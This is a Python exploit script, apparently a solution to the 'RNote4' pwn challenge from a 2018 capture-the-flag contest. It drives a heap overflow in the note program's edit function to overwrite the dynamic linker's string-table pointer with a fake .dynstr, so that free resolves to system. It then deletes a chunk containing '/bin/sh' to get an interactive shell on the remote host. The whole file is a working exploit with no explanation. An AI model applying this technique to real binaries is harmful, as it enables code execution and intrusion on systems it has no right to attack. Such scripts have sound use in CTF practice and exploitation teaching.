#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './RNote4'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'rnote4.2018.teamrois.cn', 'port':6767})
env.select()

#==========

binf = ELF(bin_file)
addr_dynamic        = binf.sep_section['.dynamic']
addr_bss            = binf.sep_section['.bss']

addr_linfo_dynstr   = addr_dynamic + 0x80
addr_fake_dynstr    = addr_bss + 0x100

#==========

def attack(conn):
    rn = RNote4(conn)

    rn.alloc('A')           # 0
    rn.alloc('B')           # 1
    rn.alloc('/bin/sh')     # 2

    l_info_dynstr    = p64(5)
    l_info_dynstr   += p64(addr_fake_dynstr)
    rn.edit(0, 'a'*0x28+p64(addr_linfo_dynstr))
    rn.edit(1, l_info_dynstr)

    fake_dynstr  = '\x00'*0x5f
    fake_dynstr += 'system\x00'
    rn.edit(0, 'b'*0x28+p64(addr_fake_dynstr))
    rn.edit(1, fake_dynstr)

    rn.delete(2)

class RNote4:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def alloc(self, content):
        content = content[:0xff]
        self.send(chr(1))
        self.send(chr(len(content)))
        self.send(content)

    def edit(self, idx, content):
        content = content[:0xff]
        self.send(chr(2))
        self.send(chr(idx))
        self.send(chr(len(content)))
        self.send(content)

    def delete(self, idx):
        self.send(chr(3))
        self.send(chr(idx))

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
